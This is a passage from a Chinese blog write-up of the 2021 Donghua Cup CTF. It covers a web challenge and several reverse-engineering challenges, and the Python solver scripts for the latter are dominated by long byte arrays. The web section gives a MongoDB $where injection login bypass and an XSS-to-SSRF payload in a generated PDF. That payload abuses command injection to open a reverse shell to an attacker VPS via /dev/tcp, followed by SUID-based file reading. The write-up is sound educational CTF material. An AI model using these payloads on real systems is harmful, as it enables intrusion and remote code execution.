handler.AdminCheckMiddleWare(), BookHandleController) 发现登录这里，sql 查询直接拼接了字符串 db_table := Conn.DB(\"ctf\").C(\"users\") result := User{} err = db_table.Find(bson.M{\"$where\":\"function() {if(this.username == '\"+user.Username+\"' &amp;&amp; this.password == '\"+user.Password+\"') {return true;}}\"}).One(&amp;result) 而 handler 这里面提示了管理员用户名是 administrator 于是构造登录请求 username=administrator&amp;password=1' || '1'=='1 成功登录。 然后再看接口，发现有个 /delete，存在命令执行，而且是拼接字符串。 func DeleteController(c *gin.Context) { // The function is temporarily inaccessible var filename Filename if err := c.ShouldBindJSON(&amp;filename); err != nil { c.JSON(500, gin.H{\"msg\": err}) return } cmd := exec.Command(\"/bin/bash\", \"-c\", \"rm ./upload/pdf/\" + filename.Filename) if err := cmd.Run(); err != nil { fmt.Println(err) return } c.String(http.StatusOK, fmt.Sprintf(\"File Deleted Successfully\")) } 然而这个只能通过本地进行访问。 func IPCheckMiddleWare() gin.HandlerFunc { return func(c *gin.Context) { if c.Request.RemoteAddr[:9] != \"127.0.0.1\" &amp;&amp; c.Request.RemoteAddr[:9] != \"localhost\" { c.JSON(403, gin.H{\"msg\": \"I'm sorry, your IP is forbidden\"}) return } c.Next() } } 再看 /submit 接口这里，可以上传 pdf，而这些输入的信息会进到 makepdf 函数里。 func BookHandleController(c *gin.Context) { var book Book if err := c.ShouldBind(&amp;book); err != nil { c.JSON(500, gin.H{\"msg\": err}) return } file, err := c.FormFile(\"covers\") if err != nil { c.String(http.StatusBadRequest, fmt.Sprintf(\"Get form err: %s\", err.Error())) return } filename := filepath.Base(file.Filename) if err := c.SaveUploadedFile(file, \"/tmp/covers/\" + filename); err != nil { c.String(http.StatusBadRequest, fmt.Sprintf(\"Upload covers err: %s\", err.Error())) return } makepdf(book.Title, book.Author, book.Description, filename) db_table := Conn.DB(\"ctf\").C(\"books\") err = db_table.Insert(&amp;book) if err != nil { c.String(http.StatusBadRequest, fmt.Sprintf(\"Signup err: %s\", err.Error())) return } c.Header(\"Content-Type\", \"text/html; charset=utf-8\") c.String(200, \"&lt;script&gt;alert('Book uploaded successfully');window.location.href='/submit'&lt;/script&gt;\") } makepdf 函数里直接将输入的东西拼接进 html 里了，然后生成 pdf，于是想到在这里构造 XSS 来进行 SSRF。 func makepdf(title, author, description, covers string) string { // Create new PDF generator pdfg, err := wkhtmltopdf.NewPDFGenerator() if err != nil { fmt.Println(err) } template := \"&lt;!DOCTYPE html&gt;\" + \"&lt;html lang='en'&gt;\" + \"&lt;head&gt;\" + \"&lt;meta charset='UTF-8'&gt;\" + \"&lt;meta name='viewport' content='width=device-width, initial-scale=1.0'&gt;\" + \"&lt;title&gt;Library&lt;/title&gt;\" + \"&lt;/head&gt;\" + \"&lt;body&gt;\" + \"&lt;center&gt;\" + \"&lt;h2&gt;Book description&lt;/h2&gt;\" + \"&lt;table border='1' cellpadding='10'&gt;\" + \"&lt;tr&gt;\" + \"&lt;th&gt;Book Title&lt;/th&gt;\" + \"&lt;td&gt;\" + title + \"&lt;/td&gt;\" + \"&lt;/tr&gt;\" + \"&lt;tr&gt;\" + \"&lt;th&gt;Author&lt;/th&gt;\" + \"&lt;td&gt;\" + author + \"&lt;/td&gt;\" + \"&lt;/tr&gt;\" + \"&lt;tr&gt;\" + \"&lt;th&gt; Content Abstract &lt;/th&gt;\" + \"&lt;td&gt;\" + description + \"&lt;/td&gt;\" + \"&lt;/tr&gt;\" + \"&lt;/table&gt;\" + \"&lt;br&gt;&lt;img src='covers/\" + covers + \"' height='300'&gt;\" + \"&lt;/center&gt;\" + \"&lt;/body&gt;\" + \"&lt;/html&gt;\" pdfg.AddPage(wkhtmltopdf.NewPageReader(strings.NewReader(template))) err = pdfg.Create() if err != nil { fmt.Println(err) } 构造 description 如下，反弹个 shell 回来。 &lt;/td&gt;&lt;script&gt;var s=new XMLHttpRequest;s.open(\"POST\",\"http://127.0.0.1:8888/delete\"); s.setRequestHeader('Content-type', 'application/json');s.send('{\"filename\":\"test.pdf|bash -i &gt;&amp; /dev/tcp/VPSIP/PORT 0&gt;&amp;1\"}');&lt;/script&gt;&lt;td&gt; VPS 上接收到反弹的 shell 发现 flag 在 /flagggisshere 但是没权限读，找找能不能借助 suid 权限来读。 $ find / -perm -u=s -type f 2&gt;/dev/null /usr/lib/xorg/Xorg.wrap /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/sbin/pppd /usr/bin/chsh /usr/bin/mount /usr/bin/chfn /usr/bin/comm /usr/bin/newgrp /usr/bin/passwd /usr/bin/su /usr/bin/gpasswd /usr/bin/umount /usr/bin/pkexec $ ls -al /usr/bin/comm -rwsr-xr-x 1 root root 43384 Sep 5 2019 comm $ comm /flagggisshere /dev/null 2&gt;/dev/null flag{a4a22262-4d19-4956-ba7c-6ac805a99785} comm SUID 读文件的介绍 Reverse这部分题目是队友做的，喵喵菜菜，喵呜。 hello hello world! 附件下载 提取码（GAME）备用下载 在 Java 中获取用户输入以及 apk 的签名，并调用 JNI 函数 stringFromJNI 进行加密。 主体部分为一个异或加密以及交换每个字符的前五位与后三位，使用调试手段获取签名后即可写出解密代码。 target = [0xca, 0xeb, 0x4a, 0x8a, 0x68, 0xe1, 0xa1, 0xeb, 0xe1, 0xee, 0x6b, 0x84, 0xa2, 0x6d, 0x49, 0xc8, 0x8e, 0xe, 0xcc, 0xe9, 0x45, 0xcf, 0x23, 0xcc, 0xc5, 0x4c, 0xc, 0x85, 0xcf, 0xa9, 0x8c, 0xf6, 0xe6, 0xd6, 0x26, 0x6d, 0xac, 0xc, 0xac, 0x77, 0xe0, 0x64] sig = [0x33, 0x30, 0x38, 0x32, 0x30, 0x32, 0x65, 0x34, 0x33, 0x30, 0x38, 0x32, 0x30, 0x31, 0x63, 0x63, 0x30, 0x32, 0x30, 0x31, 0x30, 0x31, 0x33, 0x30, 0x30, 0x64, 0x30, 0x36, 0x30, 0x39, 0x32, 0x61, 0x38, 0x36, 0x34, 0x38, 0x38, 0x36, 0x66, 0x37, 0x30, 0x64, 0x30, 0x31, 0x30, 0x31, 0x30, 0x35, 0x30, 0x35, 0x30, 0x30, 0x33, 0x30, 0x33, 0x37, 0x33, 0x31, 0x31, 0x36, 0x33, 0x30, 0x31, 0x34, 0x30, 0x36, 0x30, 0x33, 0x35, 0x35, 0x30, 0x34, 0x30, 0x33, 0x30, 0x63, 0x30, 0x64, 0x34, 0x31, 0x36, 0x65, 0x36, 0x34, 0x37, 0x32, 0x36, 0x66, 0x36, 0x39, 0x36, 0x34, 0x32, 0x30, 0x34, 0x34, 0x36, 0x35, 0x36, 0x32, 0x37, 0x35, 0x36, 0x37, 0x33, 0x31, 0x31, 0x30, 0x33, 0x30, 0x30, 0x65, 0x30, 0x36, 0x30, 0x33, 0x35, 0x35, 0x30, 0x34, 0x30, 0x61, 0x30, 0x63, 0x30, 0x37, 0x34, 0x31, 0x36, 0x65, 0x36, 0x34, 0x37, 0x32, 0x36, 0x66, 0x36, 0x39, 0x36, 0x34, 0x33, 0x31, 0x30, 0x62, 0x33, 0x30, 0x30, 0x39, 0x30, 0x36, 0x30, 0x33, 0x35, 0x35, 0x30, 0x34, 0x30, 0x36, 0x31, 0x33, 0x30, 0x32, 0x35, 0x35, 0x35, 0x33, 0x33, 0x30, 0x32, 0x30, 0x31, 0x37, 0x30, 0x64, 0x33, 0x32, 0x33, 0x31, 0x33, 0x30, 0x33, 0x33, 0x33, 0x30, 0x33, 0x36, 0x33, 0x31, 0x33, 0x34, 0x33, 0x33, 0x33, 0x30, 0x33, 0x34, 0x33, 0x38, 0x35, 0x61, 0x31, 0x38, 0x30, 0x66, 0x33, 0x32, 0x33, 0x30, 0x33, 0x35, 0x33, 0x31, 0x33, 0x30, 0x33, 0x32, 0x33, 0x32, 0x33, 0x37, 0x33, 0x31, 0x33, 0x34, 0x33, 0x33, 0x33, 0x30, 0x33, 0x34, 0x33, 0x38, 0x35, 0x61, 0x33, 0x30, 0x33, 0x37, 0x33, 0x31, 0x31, 0x36, 0x33, 0x30, 0x31, 0x34, 0x30, 0x36, 0x30, 0x33, 0x35, 0x35, 0x30, 0x34, 0x30, 0x33, 0x30, 0x63, 0x30, 0x64, 0x34, 0x31, 0x36, 0x65, 0x36, 0x34, 0x37, 0x32, 0x36, 0x66, 0x36, 0x39, 0x36, 0x34, 0x32, 0x30, 0x34, 0x34, 0x36, 0x35, 0x36, 0x32, 0x37, 0x35, 0x36, 0x37, 0x33, 0x31, 0x31, 0x30, 0x33, 0x30, 0x30, 0x65, 0x30, 0x36, 0x30, 0x33, 0x35, 0x35, 0x30, 0x34, 0x30, 0x61, 0x30, 0x63, 0x30, 0x37, 0x34, 0x31, 0x36, 0x65, 0x36, 0x34, 0x37, 0x32, 0x36, 0x66, 0x36, 0x39, 0x36, 0x34, 0x33, 0x31, 0x30, 0x62, 0x33, 0x30, 0x30, 0x39, 0x30, 0x36, 0x30, 0x33, 0x35, 0x35, 0x30, 0x34, 0x30, 0x36, 0x31, 0x33, 0x30, 0x32, 0x35, 0x35, 0x35, 0x33, 0x33, 0x30, 0x38, 0x32, 0x30, 0x31, 0x32, 0x32, 0x33, 0x30, 0x30, 0x64, 0x30, 0x36, 0x30, 0x39, 0x32, 0x61, 0x38, 0x36, 0x34, 0x38, 0x38, 0x36, 0x66, 0x37, 0x30, 0x64, 0x30, 0x31, 0x30, 0x31, 0x30, 0x31, 0x30, 0x35, 0x30, 0x30, 0x30, 0x33, 0x38, 0x32, 0x30, 0x31, 0x30, 0x66, 0x30, 0x30, 0x33, 0x30, 0x38, 0x32, 0x30, 0x31, 0x30, 0x61, 0x30, 0x32, 0x38, 0x32, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x63, 0x62, 0x66, 0x32, 0x62, 0x30, 0x39, 0x65, 0x34, 0x33, 0x30, 0x38, 0x65, 0x62, 0x62, 0x34, 0x35, 0x39, 0x65, 0x38, 0x38, 0x34, 0x31, 0x65, 0x35, 0x61, 0x37, 0x62, 0x39, 0x32, 0x30, 0x34, 0x39, 0x37, 0x66, 0x65, 0x66, 0x32, 0x62, 0x33, 0x34, 0x39, 0x65, 0x38, 0x30, 0x36, 0x34, 0x38, 0x66, 0x37, 0x65, 0x62, 0x33, 0x35, 0x66, 0x34, 0x38, 0x64, 0x34, 0x30, 0x61, 0x37, 0x35, 0x65, 0x37, 0x63, 0x65, 0x37, 0x39, 0x34, 0x35, 0x62, 0x38, 0x62, 0x34, 0x32, 0x64, 0x31, 0x39, 0x37, 0x62, 0x65, 0x63, 0x30, 0x62, 0x66, 0x31, 0x37, 0x37, 0x65, 0x36, 0x63, 0x39, 0x38, 0x39, 0x39, 0x65, 0x64, 0x37, 0x30, 0x37, 0x64, 0x63, 0x63, 0x34, 0x61, 0x37, 0x32, 0x36, 0x63, 0x62, 0x31, 0x34, 0x63, 0x31, 0x61, 0x36, 0x39, 0x62, 0x30, 0x63, 0x34, 0x61, 0x30, 0x32, 0x34, 0x37, 0x34, 0x38, 0x30, 0x36, 0x66, 0x61, 0x37, 0x33, 0x63, 0x66, 0x62, 0x31, 0x30, 0x65, 0x31, 0x30, 0x66, 0x37, 0x62, 0x31, 0x36, 0x36, 0x35, 0x30, 0x32, 0x31, 0x63, 0x32, 0x34, 0x37, 0x36, 0x32, 0x62, 0x36, 0x65, 0x64, 0x61, 0x64, 0x36, 0x35, 0x63, 0x61, 0x36, 0x33, 0x63, 0x65, 0x61, 0x33, 0x63, 0x37, 0x32, 0x65, 0x30, 0x64, 0x34, 0x65, 0x34, 0x63, 0x61, 0x33, 0x66, 0x39, 0x38, 0x33, 0x30, 0x31, 0x31, 0x37, 0x33, 0x65, 0x65, 0x63, 0x33, 0x32, 0x35, 0x34, 0x33, 0x33, 0x37, 0x61, 0x66, 0x31, 0x66, 0x35, 0x61, 0x31, 0x31, 0x66, 0x37, 0x37, 0x39, 0x65, 0x63, 0x62, 0x65, 0x30, 0x34, 0x64, 0x31, 0x62, 0x37, 0x34, 0x64, 0x35, 0x33, 0x66, 0x35, 0x38, 0x33, 0x35, 0x65, 0x30, 0x31, 0x31, 0x32, 0x32, 0x32, 0x31, 0x35, 0x35, 0x61, 0x35, 0x36, 0x66, 0x39, 0x37, 0x65, 0x30, 0x30, 0x64, 0x37, 0x35, 0x33, 0x37, 0x34, 0x63, 0x64, 0x39, 0x33, 0x30, 0x38, 0x30, 0x64, 0x66, 0x61, 0x30, 0x38, 0x37, 0x63, 0x64, 0x33, 0x35, 0x36, 0x61, 0x39, 0x39, 0x66, 0x65, 0x31, 0x65, 0x65, 0x62, 0x66, 0x35, 0x64, 0x36, 0x64, 0x35, 0x65, 0x33, 0x31, 0x38, 0x34, 0x36, 0x61, 0x61, 0x64, 0x35, 0x32, 0x35, 0x32, 0x63, 0x33, 0x61, 0x31, 0x37, 0x61, 0x34, 0x36, 0x35, 0x36, 0x65, 0x32, 0x65, 0x32, 0x31, 0x30, 0x63, 0x65, 0x31, 0x63, 0x37, 0x61, 0x61, 0x34, 0x64, 0x31, 0x34, 0x37, 0x66, 0x62, 0x38, 0x63, 0x66, 0x34, 0x34, 0x30, 0x61, 0x35, 0x30, 0x61, 0x64, 0x64, 0x36, 0x31, 0x62, 0x62, 0x62, 0x32, 0x65, 0x63, 0x32, 0x39, 0x39, 0x61, 0x32, 0x65, 0x30, 0x64, 0x61, 0x62, 0x30, 0x62, 0x34, 0x35, 0x30, 0x34, 0x37, 0x39, 0x36, 0x61, 0x63, 0x33, 0x61, 0x38, 0x39, 0x39, 0x64, 0x61, 0x35, 0x35, 0x33, 0x61, 0x62, 0x31, 0x64, 0x38, 0x33, 0x35, 0x37, 0x36, 0x36, 0x39, 0x31, 0x61, 0x62, 0x32, 0x33, 0x34, 0x30, 0x39, 0x64, 0x31, 0x38, 0x33, 0x39, 0x38, 0x30, 0x31, 0x34, 0x62, 0x33, 0x62, 0x35, 0x65, 0x61, 0x66, 0x31, 0x32, 0x65, 0x38, 0x33, 0x66, 0x34, 0x64, 0x39, 0x39, 0x61, 0x61, 0x30, 0x39, 0x65, 0x31, 0x65, 0x34, 0x65, 0x34, 0x63, 0x61, 0x65, 0x31, 0x33, 0x33, 0x35, 0x33, 0x30, 0x37, 0x33, 0x30, 0x63, 0x31, 0x31, 0x33, 0x33, 0x64, 0x61, 0x32, 0x62, 0x33, 0x64, 0x65, 0x65, 0x33, 0x37, 0x62, 0x35, 0x38, 0x65, 0x62, 0x31, 0x61, 0x35, 0x37, 0x39, 0x35, 0x62, 0x32, 0x32, 0x31, 0x65, 0x63, 0x35, 0x61, 0x38, 0x38, 0x33, 0x30, 0x37, 0x33, 0x31, 0x61, 0x34, 0x31, 0x31, 0x36, 0x37, 0x64, 0x32, 0x39, 0x35, 0x66, 0x39, 0x65, 0x31, 0x62, 0x30, 0x32, 0x30, 0x33, 0x30, 0x31, 0x30, 0x30, 0x30, 0x31, 0x33, 0x30, 0x30, 0x64, 0x30, 0x36, 0x30, 0x39, 0x32, 0x61, 0x38, 0x36, 0x34, 0x38, 0x38, 0x36, 0x66, 0x37, 0x30, 0x64, 0x30, 0x31, 0x30, 0x31, 0x30, 0x35, 0x30, 0x35, 0x30, 0x30, 0x30, 0x33, 0x38, 0x32, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x30, 0x65, 0x34, 0x37, 0x34, 0x30, 0x32, 0x33, 0x35, 0x65, 0x39, 0x63, 0x66, 0x32, 0x62, 0x65, 0x33, 0x33, 0x64, 0x65, 0x33, 0x65, 0x30, 0x36, 0x64, 0x37, 0x37, 0x37, 0x31, 0x33, 0x39, 0x63, 0x62, 0x62, 0x63, 0x35, 0x63, 0x66, 0x30, 0x36, 0x32, 0x32, 0x32, 0x38, 0x35, 0x63, 0x31, 0x37, 0x64, 0x61, 0x30, 0x34, 0x36, 0x39, 0x37, 0x62, 0x38, 0x30, 0x36, 0x37, 0x33, 0x31, 0x38, 0x61, 0x61, 0x66, 0x38, 0x64, 0x66, 0x30, 0x66, 0x62, 0x62, 0x34, 0x64, 0x33, 0x31, 0x36, 0x36, 0x66, 0x32, 0x39, 0x33, 0x65, 0x61, 0x31, 0x35, 0x61, 0x61, 0x32, 0x35, 0x39, 0x32, 0x66, 0x30, 0x36, 0x65, 0x62, 0x36, 0x39, 0x32, 0x39, 0x61, 0x66, 0x30, 0x36, 0x33, 0x37, 0x32, 0x32, 0x61, 0x63, 0x39, 0x66, 0x33, 0x30, 0x61, 0x64, 0x38, 0x35, 0x65, 0x32, 0x63, 0x30, 0x38, 0x37, 0x35, 0x36, 0x34, 0x39, 0x33, 0x31, 0x64, 0x36, 0x61, 0x63, 0x36, 0x35, 0x66, 0x63, 0x64, 0x35, 0x66, 0x62, 0x63, 0x38, 0x36, 0x34, 0x62, 0x33, 0x64, 0x63, 0x39, 0x38, 0x34, 0x31, 0x65, 0x30, 0x33, 0x39, 0x63, 0x36, 0x65, 0x31, 0x64, 0x35, 0x66, 0x62, 0x63, 0x35, 0x63, 0x32, 0x66, 0x38, 0x61, 0x64, 0x66, 0x39, 0x30, 0x61, 0x35, 0x34, 0x37, 0x62, 0x63, 0x34, 0x65, 0x62, 0x63, 0x30, 0x37, 0x64, 0x33, 0x38, 0x37, 0x39, 0x31, 0x34, 0x64, 0x62, 0x32, 0x34, 0x34, 0x35, 0x31, 0x63, 0x32, 0x63, 0x63, 0x38, 0x39, 0x39, 0x32, 0x35, 0x33, 0x35, 0x39, 0x62, 0x64, 0x33, 0x62, 0x62, 0x30, 0x37, 0x35, 0x30, 0x63, 0x37, 0x61, 0x61, 0x62, 0x66, 0x39, 0x64, 0x37, 0x34, 0x33, 0x62, 0x31, 0x38, 0x39, 0x33, 0x65, 0x39, 0x38, 0x62, 0x62, 0x63, 0x38, 0x66, 0x66, 0x37, 0x34, 0x62, 0x32, 0x34, 0x66, 0x63, 0x30, 0x62, 0x34, 0x62, 0x65, 0x32, 0x64, 0x62, 0x61, 0x61, 0x66, 0x31, 0x63, 0x39, 0x31, 0x37, 0x62, 0x62, 0x61, 0x30, 0x31, 0x34, 0x39, 0x36, 0x64, 0x30, 0x36, 0x31, 0x37, 0x66, 0x66, 0x63, 0x33, 0x61, 0x34, 0x61, 0x38, 0x62, 0x37, 0x61, 0x36, 0x65, 0x37, 0x39, 0x61, 0x33, 0x30, 0x33, 0x36, 0x32, 0x39, 0x38, 0x61, 0x36, 0x65, 0x62, 0x66, 0x35, 0x37, 0x62, 0x62, 0x30, 0x30, 0x30, 0x30, 0x31, 0x65, 0x34, 0x33, 0x61, 0x30, 0x62, 0x32, 0x34, 0x32, 0x38, 0x36, 0x34, 0x65, 0x65, 0x62, 0x62, 0x30, 0x66, 0x63, 0x65, 0x63, 0x39, 0x65, 0x33, 0x32, 0x33, 0x31, 0x34, 0x34, 0x64, 0x34, 0x34, 0x34, 0x37, 0x63, 0x38, 0x37, 0x38, 0x34, 0x33, 0x30, 0x66, 0x31, 0x38, 0x65, 0x36, 0x65, 0x33, 0x35, 0x38, 0x61, 0x64, 0x39, 0x37, 0x35, 0x36, 0x36, 0x66, 0x61, 0x30, 0x34, 0x64, 0x31, 0x66, 0x30, 0x37, 0x62, 0x31, 0x37, 0x31, 0x63, 0x31, 0x34, 0x37, 0x36, 0x63, 0x39, 0x61, 0x66, 0x35, 0x61, 0x31, 0x65, 0x62, 0x61, 0x30, 0x62, 0x66, 0x36, 0x36, 0x31, 0x36, 0x65, 0x32, 0x31, 0x39, 0x63, 0x30, 0x62, 0x39, 0x65, 0x31, 0x32, 0x39, 0x39, 0x64, 0x30, 0x39, 0x66, 0x65, 0x63, 0x64, 0x65, 0x64, 0x32, 0x34, 0x61, 0x38, 0x38, 0x30, 0x33, 0x39, 0x37, 0x66, 0x39, 0x32, 0x65, 0x30, 0x66, 0x39, 0x39, 0x64, 0x38, 0x39, 0x35, 0x31, 0x32, 0x32, 0x38, 0x63, 0x37, 0x37, 0x37, 0x30, 0x63, 0x31, 0x38, 0x34, 0x66, 0x64, 0x37, 0x37, 0x61, 0x64, 0x66, 0x66, 0x39, 0x34, 0x33, 0x62, 0x66, 0x63, 0x38, 0x62, 0x36, 0x61, 0x61, 0x35, 0x32, 0x34, 0x63, 0x35, 0x66, 0x30, 0x61, 0x36, 0x64, 0x37, 0x36, 0x38, 0x36, 0x66, 0x65, 0x33, 0x35, 0x34, 0x38, 0x36, 0x0, 0x20, 0x2a, 0x20, 0x72, 0x61, 0x64, 0x69, 0x69, 0x20, 0x2b, 0x20, 0x61, 0x61, 0x5f, 0x6f, 0x75, 0x74, 0x73, 0x65, 0x74, 0x3b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x1, 0xcb, 0x8, 0x7c, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x50, 0x72, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x3f, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x3d, 0x20, 0x63, 0x6f, 0x72, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x5f, 0x6f, 0x75, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0xc4, 0xe, 0x77, 0x7b, 0x0, 0x0, 0x0, 0x18, 0xc5, 0xe, 0x77, 0x7b, 0x0, 0x0, 0x0, 0x28, 0xc9, 0xe, 0x77, 0x7b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x49, 0x1a, 0x77, 0x7b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6c, 0x69, 0x6e, 0x65, 0x61, 0x72, 0x5f, 0x63, 0x6f, 0x76, 0x65, 0x72, 0x61, 0x67, 0x65, 0x20, 0x3d, 0x20, 0x61, 0x61, 0x5f, 0x62, 0x6c, 0x6f, 0x61, 0x74, 0x5f, 0x61, 0x6e, 0x64, 0x5f, 0x63, 0x6f, 0x76, 0x65, 0x72, 0x61, 0x67, 0x65, 0x2e, 0x77, 0x3b, 0x66, 0x6c, 0x6f, 0x61, 0x74, 0x32, 0x20, 0x70, 0x69, 0x78, 0x65, 0x6c, 0x6c, 0x65, 0x6e, 0x67, 0x74, 0x68, 0x20, 0x3d, 0x20, 0x69, 0x6e, 0x76, 0x65, 0x72, 0x73, 0x65, 0x73, 0x71, 0x72, 0x74, 0x28, 0x66, 0x6c, 0x6f, 0x61, 0x74, 0x32, 0x28, 0x64, 0x6f, 0x74, 0x28, 0x73, 0x6b, 0x65, 0x77, 0x2e, 0x78, 0x7a, 0x2c, 0x20, 0x73, 0x6b, 0x65, 0x77, 0x2e, 0x78, 0x7a, 0x29, 0x2c, 0x20, 0x64, 0x6f, 0x74, 0x28, 0x73, 0x6b, 0x65, 0x77, 0x2e, 0x79, 0x77, 0x2c, 0x20, 0x73, 0x6b, 0x65, 0x77, 0x2e, 0x79, 0x77, 0x29, 0x29, 0x29, 0x3b, 0x66, 0x6c, 0x6f, 0x61, 0x74, 0x34, 0x20, 0x6e, 0x6f, 0x72, 0x6d, 0x61, 0x6c, 0x69, 0x7a, 0x65, 0x64, 0x5f, 0x61, 0x78, 0x69, 0x73, 0x5f, 0x64, 0x69, 0x72, 0x73, 0x20, 0x3d, 0x20, 0x73, 0x6b, 0x65, 0x77, 0x20, 0x2a, 0x20, 0x70, 0x69, 0x78, 0x65, 0x6c, 0x6c, 0x65, 0x6e, 0x67, 0x74, 0x68, 0x2e, 0x78, 0x79, 0x78, 0x79, 0x3b, 0x66, 0x6c, 0x6f, 0x61, 0x74, 0x32, 0x20, 0x61, 0x78, 0x69, 0x73, 0x77, 0x69, 0x64, 0x74, 0x68, 0x73, 0x20, 0x3d, 0x20, 0x28, 0x61, 0x62, 0x73, 0x28, 0x6e, 0x6f, 0x72, 0x6d, 0x61, 0x6c, 0x69, 0x7a, 0x65, 0x64, 0x5f, 0x61, 0x78, 0x69, 0x73, 0x5f, 0x64, 0x69, 0x72, 0x73, 0x2e, 0x78, 0x79, 0x29] for i in range(42): target[i] = (target[i] &lt;&lt; 3) | (target[i] &gt;&gt; 5); target[0] ^= sig[327]; for i in range(1, 42): target[i] ^= sig[354 + 27 * (i - 1)] + i; print(''.join(map(lambda x: chr(x &amp; 0xff), target))); ooo 如何解呢？ 附件下载 提取码（GAME）备用下载 使用输入字符串的第7、8、9位异或的值对全字符串进行异或，并于最终结果进行比较。 值得注意的是最终结果的7、8、9位异或并不为0，说明该段内存中的值被改变过，可以找到在401D94处的函数对最终结果做了一个异或0x17的操作。 猜测 flag 第一位为 f，即可解出该题。 key = [17,283,534,784,1036,1350,1604,1809,2116,2370,2625,2881,3140,3418,3650,3911,4118,4419,4698,4931,5184,5440,5653,5978,6213,6464,6735,6933,7258,7445,7744,8006,8262,8519,8773,9025,9233,9489,9792,10006,10259,10506] key = [i ^ 0x17 for i in key] print(''.join([chr((i ^ key[0] ^ ord('f')) &amp; 0xff) for i in key])) mod 花花总喜欢把东西隐藏起来。 附件下载 提取码（GAME）备用下载 代码中存在两处花指令，分别为4013E4与401203。 去除花指令后，可以看出代码对输入进行三个一组的编码，爆破即可。 charset = 'ABCDFEGH1JKLRSTMNP0VWQUXY2a8cdefijklmnopghwxyqrstuvzOIZ34567b9+/' enc = [charset.index( i) for i in '2aYcdfL2fS1BTMMF1RSeMTTASS1OJ8RHTJdBYJ2STJfNMSMAYcKUJddp'] res = [] def f(i): for a1 in range(32, 128): for a2 in range(32, 128): for a3 in range(32, 128): a = [a1, a2, a3] if enc[4 * i] == (((a[2] &amp; 3) &lt;&lt; 2) | a[1] &amp; 0x30 | a[0] &amp; 0xC0) &gt;&gt; 2 \\ and enc[4 * i + 1] == (((a[0] &amp; 3) &lt;&lt; 2) | a[2] &amp; 0x30 | a[1] &amp; 0xC0) &gt;&gt; 2 \\ and enc[4 * i + 2] == (((a[1] &amp; 3) &lt;&lt; 2) | a[0] &amp; 0x30 | a[2] &amp; 0xC0) &gt;&gt; 2 \\ and enc[4 * i + 3] == (a[2] &amp; 0xC | (a[1] &lt;&lt; 2) &amp; 0x30 | (a[0] &lt;&lt; 4) &amp; 0xC0) &gt;&gt; 2: print(''.join(map(chr, a)), end='') return for i in range(0, len(enc) // 4): f(i) print() # flag{5a073724-8223-413d-11fa-d53b133df89e} 小结往年的这个比赛都挺水的，不过不懂为啥，今年开始这比赛也卷起来了。 比如这次的 web 题还是挺难的，有道 Java 题目要自己构造恶意类进行反序列化，可惜喵喵目前还不会 Java，其他师傅说会 Java 就能出，喵喵哭哭。 有个 nodejs 考的是数组 bypass SQL 注入 + hbs 模板引擎 RCE，还是有点巧妙的，咱没想到。 东华杯2021-WEB-WriteUp eznode 东华杯WEB 赛后复现 还有个 Apache 的反代，内网是个 weblogic，听说就两个 CVE 一打就行，然而喵喵不会，呜呜。 Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸 噢你问我为啥不做 pwn，因为队友学弟看到堆题直接跑了（摊手.jpg，怎么大家都会 pwn 啊 喵喵好菜啊！！！ 摸了摸了，咱全国总排名 43，上海市排第三，喵喵摸大鱼去了。 （笑死，这比赛上海就没啥队伍打的亚子，签个到都能进决赛 再看看前面的大佬有多卷，喵呜！ （溜了溜了喵~","path":"2021/11/02/CTF_2021donghua/"},{"title":"CTF | 2021 第四届“强网”拟态防御国际精英挑战赛 SU WriteUp","text":"引言 第四届“强网”拟态防御国际精英挑战赛 - 线上预选赛 比赛时间: 2021-10-23 09:00 ~ 2021-10-25 09:00 比赛官网: http://nest.pmlabs.com.cn/ 